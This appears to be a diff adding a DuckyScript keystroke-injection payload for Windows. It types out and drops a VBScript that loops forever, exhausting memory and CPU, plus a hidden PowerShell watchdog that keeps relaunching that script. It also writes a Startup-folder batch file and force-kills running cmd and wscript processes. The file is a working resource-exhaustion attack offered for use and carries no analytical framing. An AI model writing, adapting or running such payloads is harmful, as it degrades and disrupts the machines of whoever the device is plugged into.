@@ -1,0 +1,104 @@
+DELAY 1500
+GUI r
+DELAY 1000
+STRING cmd
+ENTER
+DELAY 2000
+STRING del %tmp%\slow.vbs
+ENTER
+STRING del "%tmp%\watchdog.ps1"
+ENTER
+STRING del "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\another_script.bat"
+ENTER
+STRING cd %tmp% && copy con slow.vbs
+ENTER
+STRING Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+ENTER
+STRING Set colItems = objWMIService.ExecQuery("Select * from Win32_ComputerSystem")
+ENTER
+STRING For Each objItem in colItems
+ENTER
+STRING totalRam = objItem.TotalPhysicalMemory
+ENTER
+STRING Next
+ENTER
+STRING halfRam = totalRam / 3
+ENTER
+STRING stringSize = halfRam / 2
+ENTER
+STRING Do
+ENTER
+STRING bigStr = String(stringSize, "A")
+ENTER
+STRING bigStr2 = String(stringSize, "B")
+ENTER
+STRING bigStr3 = String(stringSize, "C")
+ENTER
+STRING bigStr4 = String(stringSize, "D")
+ENTER
+STRING bigStr5 = String(stringSize, "E")
+ENTER
+STRING result = 0
+ENTER
+STRING For i = 1 To 10000000
+ENTER
+STRING result = result + ((i * i * i * i) + (i * i * i) + (i / 5) + (i * (i + 1)))
+ENTER
+STRING Next
+ENTER
+STRING Loop
+ENTER
+CTRL z
+ENTER
+STRING cd "%tmp%\" && copy con watchdog.ps1
+ENTER
+STRING $scriptPath = "$env:temp\slow.vbs"
+ENTER
+STRING $watchdogRunning = $false
+ENTER
+STRING $cmdProcess = Get-Process cmd -ErrorAction SilentlyContinue
+ENTER
+STRING $wscriptProcess = Get-Process wscript -ErrorAction SilentlyContinue
+ENTER
+STRING if ($cmdProcess -and $wscriptProcess) {
+ENTER
+STRING     Write-Host "Terminating both cmd.exe and wscript.exe."
+ENTER
+STRING     Stop-Process -Name cmd -Force
+ENTER
+STRING     Stop-Process -Name wscript -Force
+ENTER
+STRING }
+ENTER
+STRING while ($true) {
+ENTER
+STRING     $wscriptProcess = Get-Process wscript -ErrorAction SilentlyContinue
+ENTER
+STRING     if (-not $wscriptProcess) {
+ENTER
+STRING         Start-Process "wscript.exe" $scriptPath
+ENTER
+STRING         $watchdogRunning = $true
+ENTER
+STRING     }
+ENTER
+STRING     Start-Sleep -Seconds 10
+ENTER
+STRING }
+ENTER
+CTRL z
+ENTER
+STRING cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup && copy con another_script.bat
+ENTER
+STRING del "%tmp%\slow.vbs"
+ENTER
+STRING del "%tmp%\watchdog.ps1"
+ENTER
+STRING del "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\another_script.bat" && exit
+ENTER
+CTRL z
+ENTER
+STRING start "" powershell.exe -WindowStyle Hidden -File "%tmp%\watchdog.ps1"
+ENTER
+STRING exit
+ENTER
